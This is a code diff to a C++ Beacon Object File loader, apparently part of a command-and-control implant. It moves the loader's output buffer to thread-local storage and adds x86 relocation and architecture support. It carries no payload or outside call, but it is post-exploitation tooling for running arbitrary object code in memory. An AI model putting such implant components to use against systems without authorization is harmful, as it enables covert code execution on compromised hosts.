@@ -49,10 +49,11 @@ typedef struct {
     int   size;
 } datap;
 
-// ── Global output capture buffer ──────────────────────────────────────────────
-// Set before ObjectLdr() runs, cleared after. Safe because the worker
-// thread executes tasks sequentially — no concurrent BOF runs.
-static std::string* g_bofOut = nullptr;
+// ── Per-thread output capture buffer ─────────────────────────────────────────
+// Using thread-local storage avoids any data race if BOFs were ever run on
+// multiple threads simultaneously.  The pointer is set before ObjectLdr()
+// and cleared after.
+static thread_local std::string* tls_bofOut = nullptr;
 
 // ── Beacon API implementations ────────────────────────────────────────────────
 static void BeaconDataParse(datap* parser, char* buffer, int size) {
@@ -101,20 +102,20 @@ static char* BeaconDataExtract(datap* parser, int* size) {
 
 // BeaconOutput and BeaconPrintf write to the capture buffer.
 static void BeaconOutput(int /*type*/, char* data, int /*len*/) {
-    if (g_bofOut && data) {
-        g_bofOut->append(data);
-        g_bofOut->push_back('\n');
+    if (tls_bofOut && data) {
+        tls_bofOut->append(data);
+        tls_bofOut->push_back('\n');
     }
 }
 
 static void BeaconPrintf(int /*type*/, char* fmt, ...) {
-    if (!g_bofOut || !fmt) return;
+    if (!tls_bofOut || !fmt) return;
     char buf[4096] = {};
     va_list va;
     va_start(va, fmt);
     vsnprintf(buf, sizeof(buf) - 1, fmt, va);
     va_end(va);
-    g_bofOut->append(buf);
+    tls_bofOut->append(buf);
 }
 
 // ── Symbol resolution ─────────────────────────────────────────────────────────
@@ -183,6 +184,7 @@ static ULONG ObjectVirtualSize(POBJECT_CTX ObjCtx) {
 // ── Relocation fixup ──────────────────────────────────────────────────────────
 static VOID ObjectRelocation(ULONG Type, PVOID Reloc, PVOID SecBase) {
     switch (Type) {
+    // AMD64 relocations
     case IMAGE_REL_AMD64_REL32:
         *(PUINT32)Reloc += (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - 4); break;
     case IMAGE_REL_AMD64_REL32_1:
@@ -197,6 +199,11 @@ static VOID ObjectRelocation(ULONG Type, PVOID Reloc, PVOID SecBase) {
         *(PUINT32)Reloc += (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - 9); break;
     case IMAGE_REL_AMD64_ADDR64:
         *(PUINT64)Reloc += (ULONG64)SecBase; break;
+    // x86 (i386) relocations
+    case IMAGE_REL_I386_DIR32:
+        *(PUINT32)Reloc += (UINT32)(ULONG_PTR)SecBase; break;
+    case IMAGE_REL_I386_REL32:
+        *(PUINT32)Reloc += (UINT32)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - 4); break;
     }
 }
 
@@ -219,8 +226,8 @@ static BOOL ObjectProcessSection(POBJECT_CTX ObjCtx) {
             if (strncmp("__imp_", Symbol, 6) == 0) {
                 Resolved = ObjectResolveSymbol(Symbol);
                 if (!Resolved) {
-                    if (g_bofOut)
-                        g_bofOut->append("[BOF] failed to resolve: ").append(Symbol + 6).push_back('\n');
+                    if (tls_bofOut)
+                        tls_bofOut->append("[BOF] failed to resolve: ").append(Symbol + 6).push_back('\n');
                     return FALSE;
                 }
             }
@@ -286,12 +293,15 @@ static BOOL ObjectLdr(PVOID pObject, PSTR sFunction, PBYTE pArgs, ULONG uArgc) {
     {
         SYSTEM_INFO si = {};
         GetNativeSystemInfo(&si);
-        WORD expected = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
-            ? IMAGE_FILE_MACHINE_AMD64
-            : IMAGE_FILE_MACHINE_ARM64;
+        WORD expected;
+        switch (si.wProcessorArchitecture) {
+        case PROCESSOR_ARCHITECTURE_AMD64: expected = IMAGE_FILE_MACHINE_AMD64; break;
+        case PROCESSOR_ARCHITECTURE_ARM64: expected = IMAGE_FILE_MACHINE_ARM64; break;
+        default:                           expected = IMAGE_FILE_MACHINE_I386;  break;
+        }
         if (ObjCtx.Header->Machine != expected) {
-            if (g_bofOut)
-                g_bofOut->append("Error: BOF architecture does not match the current process.");
+            if (tls_bofOut)
+                tls_bofOut->append("Error: BOF architecture does not match the current process.");
             return FALSE;
         }
     }
@@ -321,8 +331,8 @@ static BOOL ObjectLdr(PVOID pObject, PSTR sFunction, PBYTE pArgs, ULONG uArgc) {
         goto _CLEANUP;
 
     if (!ObjectExecute(&ObjCtx, sFunction, pArgs, uArgc)) {
-        if (g_bofOut)
-            g_bofOut->append("Error: entry point '").append(sFunction).append("' not found in BOF.");
+        if (tls_bofOut)
+            tls_bofOut->append("Error: entry point '").append(sFunction).append("' not found in BOF.");
         goto _CLEANUP;
     }
 
@@ -386,7 +396,7 @@ std::string RunBOF(std::vector<std::string> arguments, const std::string& file_d
         return "Error: file too small to be a COFF object";
 
     std::string output;
-    g_bofOut = &output;
+    tls_bofOut = &output;
 
     std::string binaryBlob;
     if (!file2_data.empty())
@@ -398,7 +408,7 @@ std::string RunBOF(std::vector<std::string> arguments, const std::string& file_d
 
     BOOL ok = ObjectLdr(assembly.data(), (PSTR)"go", pArgs, uArgc);
 
-    g_bofOut = nullptr;
+    tls_bofOut = nullptr;
 
     if (!ok && output.empty())
         return "Error: BOF execution failed";
